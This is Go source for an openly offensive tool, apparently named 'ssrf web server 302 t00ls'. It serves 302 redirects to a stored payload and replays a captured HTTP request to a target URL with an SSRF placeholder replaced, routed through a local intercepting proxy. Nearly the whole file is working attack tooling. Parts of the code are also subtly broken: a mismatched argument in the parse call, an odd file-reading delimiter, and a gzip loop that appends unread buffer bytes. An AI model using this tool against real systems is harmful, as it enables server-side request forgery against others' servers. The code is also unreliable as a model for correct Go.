package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"urfave/cli"
)

func main() {
	app := &cli.App{
		Name: "ssrf web server 302 t00ls",
		Usage: "requst package payload [ssrf_data]",
		Flags: []cli.Flag {
			&cli.StringFlag{
				Name: "filename",
				Value: "",
				Usage: "http request package",
			},
			&cli.StringFlag{
				Name:        "port",
				Value: "80",
				Usage:"web server port",
			},
			&cli.StringFlag{
				Name: "url",
				Value: "",
				Usage: "target url",
			},
			&cli.StringFlag{
				Name: "lserver",
				Value: "",
				Usage: "listen server domain or ip",
			},
		},
		Action: func(c *cli.Context) error {
			if c.String("filename") != "" || c.String("url") != "" || c.String("lserver") != ""{
				webserver(c.String("port"),c.String("filename"),c.String("url"),c.String("lserver"))
			}else{
				fmt.Println("filename or url is empty. command:help")
			}
			return nil
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
func webserver(port string,filename string,url string,lserver string){
	fmt.Print("web server start")
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request,) {
		r.ParseForm()
		payload := r.PostFormValue("payload")
		if payload != "" {
			save(payload)
			reqParse := parse(lserver,filename)
			response,_ := RequestRepay(payload, reqParse,url)
			w.Write(response)
		}else{
			payload := read()
			w.Header().Set("Location",payload)
			w.WriteHeader(302)
		}

	})
	log.Fatal(http.ListenAndServe(":"+port, nil))
}
//读取文件
func read() string{
	fi, err := os.OpenFile("tmp-ssrf.txt",os.O_RDONLY,0777)
	if err!=nil{
		log.Fatalln("读取payload失败",err)
	}
	defer fi.Close()
	buf := bufio.NewReader(fi)
	len := buf.Size()
	packages,_ := buf.ReadString(byte(len))
	return packages
}
//保存payload
func save(payload string){
	fi, err := os.OpenFile("tmp-ssrf.txt",os.O_WRONLY|os.O_TRUNC|os.O_CREATE,0777)
	if err!=nil{
		log.Fatalln("读取请求包文件失败",err)
		panic("读取请求包文件失败")
	}
	defer fi.Close()
	w := bufio.NewWriter(fi)
	_, err3 := w.WriteString(payload)
	if err3!=nil{
		panic(err3)
	}
	w.Flush()
}
//payload 替换，并解析包
func parse(payload string,filename string) *http.Request{
	fi, err := os.Open(filename)
	if err != nil {
		panic(err)
	}
	defer fi.Close()
	bufss:= bufio.NewReader(fi)
	len := bufss.Size()
	packages,_ := bufss.ReadString(byte(len))
	packages = strings.Replace(packages,"[ssrf_data]",payload,1)
	bufss.Reset(bufss)
	readstring := strings.NewReader(packages)
	//fmt.Println(packages)
	buf := bufio.NewReader(readstring)
	req, err := http.ReadRequest(buf)
	if err != nil {
		panic(err)
	}
	return  req
}
//重放包
func RequestRepay(payload string,req *http.Request,urls string) (body []byte,err error) {
	proxyUrl, err := url.Parse("http://127.0.0.1:8080")
	http.DefaultTransport = &http.Transport{Proxy: http.ProxyURL(proxyUrl)}
	client := &http.Client{}
	method := req.Method
	bodymsg, _ := ioutil.ReadAll(req.Body)
	reembody := bytes.NewBuffer([]byte(bodymsg))
	request, err := http.NewRequest(method, urls, reembody)
	if err!=nil{
		fmt.Print(err)
	}
	request.Header = req.Header
	request.Header.Del("Content-Length")
	response, err := client.Do(request)
	if err != nil {
		fmt.Print(err)
		return
	}
	if response.Body != nil{
		switch response.Header.Get("Content-Encoding") {
		case "gzip":
			reader, _ := gzip.NewReader(response.Body)
			for {
				buf := make([]byte, 1024)
				n, err := reader.Read(buf)

				if err != nil && err != io.EOF {
					panic(err)
				}
				if n == 0 {
					break
				}
				body = append(body, buf...);
			}
		default:
			body, _ = ioutil.ReadAll(response.Body)

		}
	}
	response.Body.Close()
	return
}